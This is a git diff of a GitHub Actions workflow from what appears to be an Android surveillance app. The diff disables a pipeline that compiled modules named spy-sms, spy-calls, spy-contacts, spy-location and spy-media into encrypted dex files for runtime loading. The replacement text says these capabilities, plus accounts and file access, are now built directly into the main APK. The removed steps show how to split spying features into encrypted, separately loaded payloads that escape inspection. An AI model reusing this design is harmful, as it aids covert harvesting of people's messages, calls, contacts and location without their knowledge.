@@ -1,180 +1,27 @@
-name: Build Dex Modules
+name: Build Dex Modules (DISABLED)
 # =============================================================================
-# ⚠️  WAJIB: Semua APK HARUS menggunakan keystore dari GitHub Secrets.
-#     Secrets yang diperlukan:
-#       - KEYSTORE_BASE64     : keystore file (PKCS12, base64-encoded)
-#       - KEYSTORE_PASSWORD   : password keystore
-#       - KEY_ALIAS           : alias key di dalam keystore
-#       - KEY_PASSWORD        : password key
-#
-#     DILARANG menggunakan debug keystore default Android / keystore lokal.
-#     Keystore konsisten = semua APK (debug/release/uninstaller) bisa
-#     saling update satu sama lain tanpa error "SHA berbeda".
+# ℹ️  Workflow ini DISABLED — semua module (SMS, Calls, Contacts, Location,
+#     Media, Accounts, FileManager) sudah di-inline langsung ke APK utama.
+#     DexModuleLoader sudah dihapus. Tidak perlu build/encrypt dex terpisah.
 # =============================================================================
-
 
 on:
-  push:
-    branches: [ main, master ]
-    paths:
-      - 'dex-modules/**'
-      - 'scripts/encrypt-dex.js'
-      - '.github/workflows/build-dex-modules.yml'
   workflow_dispatch:
-
-concurrency:
-  group: build-dex-modules
-  cancel-in-progress: false
-
-permissions:
-  contents: write
+    inputs:
+      reason:
+        description: 'Workflow ini disabled. Module sudah inline di APK.'
+        required: false
 
 jobs:
-  build-dex:
-    name: Build & Encrypt Dex Modules
+  disabled:
+    name: Workflow Disabled
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-        with:
-          token: ${{ secrets.GITHUB_TOKEN }}
-          fetch-depth: 0
-
-      - name: Setup JDK 17
-        uses: actions/setup-java@v4
-        with:
-          distribution: 'temurin'
-          java-version: '17'
-          cache: 'gradle'
-
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '24'
-
-      - name: Setup Gradle
-        uses: gradle/actions/setup-gradle@v4
-        with:
-          gradle-version: '8.4'
-
-      - name: Generate Gradle Wrapper
-        run: |
-          cd android
-          gradle wrapper --gradle-version 8.4
-          chmod +x gradlew
-
-      - name: Setup Android SDK
-        uses: android-actions/setup-android@v3
-
-      - name: Accept Licenses
-        run: yes | sdkmanager --licenses || true
-
-      - name: Build dex-modules AAR
-        run: |
-          cd android
-          ./gradlew :dex-modules:assembleRelease --no-daemon
-          echo "=== AAR output ==="
-          ls -lh ../dex-modules/build/outputs/aar/
-
-      - name: Extract classes.jar from AAR
-        run: |
-          AAR=dex-modules/build/outputs/aar/dex-modules-release.aar
-          mkdir -p /tmp/jar-unpack
-          unzip -o "$AAR" classes.jar -d /tmp/jar-unpack
-          echo "=== classes inside jar ==="
-          jar tf /tmp/jar-unpack/classes.jar | grep "\.class$"
-
-      - name: Split & encrypt per-module dex
-        run: |
-          D8=$(find $ANDROID_SDK_ROOT/build-tools -name "d8" | sort -V | tail -1)
-          ANDROID_JAR=$(find $ANDROID_SDK_ROOT/platforms -name "android.jar" | sort -rV | head -1)
-          echo "d8     : $D8"
-          echo "android: $ANDROID_JAR"
-
-          declare -A MODULES
-          MODULES["spy-sms"]="SmsModule"
-          MODULES["spy-calls"]="CallLogModule"
-          MODULES["spy-contacts"]="ContactsModule"
-          MODULES["spy-location"]="LocationModule"
-          MODULES["spy-media"]="MediaModule"
-
-          mkdir -p public/modules
-
-          for module_name in "${!MODULES[@]}"; do
-            class_name="${MODULES[$module_name]}"
-            echo ""
-            echo "▶ $module_name → $class_name"
-
-            tmp_cls="/tmp/split/$module_name/cls"
-            tmp_dex="/tmp/split/$module_name/dex"
-            mkdir -p "$tmp_cls" "$tmp_dex"
-
-            cd "$tmp_cls"
-            jar xf /tmp/jar-unpack/classes.jar \
-              "com/android/modules/${class_name}.class" 2>/dev/null || true
-            jar tf /tmp/jar-unpack/classes.jar \
-              | grep "^com/android/modules/${class_name}[\$\.]" \
-              | xargs -r jar xf /tmp/jar-unpack/classes.jar 2>/dev/null || true
-            cd -
-
-            CLASS_COUNT=$(find "$tmp_cls" -name "*.class" | wc -l)
-            echo "  extracted: $CLASS_COUNT class file(s)"
-
-            if [ "$CLASS_COUNT" -eq 0 ]; then
-              echo "  ⚠️  No classes for $class_name — skip"
-              continue
-            fi
-
-            find "$tmp_cls" -name "*.class" | xargs $D8 \
-              --lib "$ANDROID_JAR" \
-              --min-api 26 \
-              --release \
-              --output "$tmp_dex"
-
-            ls -lh "$tmp_dex/"
-
-            node scripts/encrypt-dex.js \
-              "$tmp_dex/classes.dex" \
-              "public/modules/${module_name}.dex.enc"
-
-            echo "  ✅ public/modules/${module_name}.dex.enc"
-          done
-
+      - run: |
+          echo "⚠️ Workflow ini sudah tidak diperlukan."
+          echo "Semua module (SMS, Calls, Contacts, Location, Media, Accounts, Files)"
+          echo "sudah diinline langsung ke APK utama di:"
+          echo "  android/app/src/main/kotlin/com/nexlink/bridge/modules/"
           echo ""
-          echo "=== Final encrypted modules ==="
-          ls -lh public/modules/*.dex.enc
-
-      - name: Commit encrypted dex to repo
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          git config user.name  "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-          git remote set-url origin \
-            "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git"
-
-          git add public/modules/spy-*.dex.enc
-
-          if git diff --staged --quiet; then
-            echo "✅ No changes — dex files unchanged, nothing to commit"
-            exit 0
-          fi
-
-          # Commit dulu baru pull --rebase supaya tidak konflik
-          git commit -m "chore: update per-module encrypted dex [skip ci]"
-          git pull --rebase origin main
-          git push origin main
-          echo "✅ Pushed successfully"
-
-      - name: Summary
-        run: |
-          echo "## ✅ Per-Module Dex Built" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "| Module | File | Size |" >> $GITHUB_STEP_SUMMARY
-          echo "|--------|------|------|" >> $GITHUB_STEP_SUMMARY
-          for f in public/modules/spy-*.dex.enc; do
-            name=$(basename "$f" .dex.enc)
-            size=$(ls -lh "$f" | awk '{print $5}')
-            echo "| \`$name\` | $(basename $f) | $size |" >> $GITHUB_STEP_SUMMARY
-          done
+          echo "DexModuleLoader sudah dihapus dari codebase."
+          exit 0
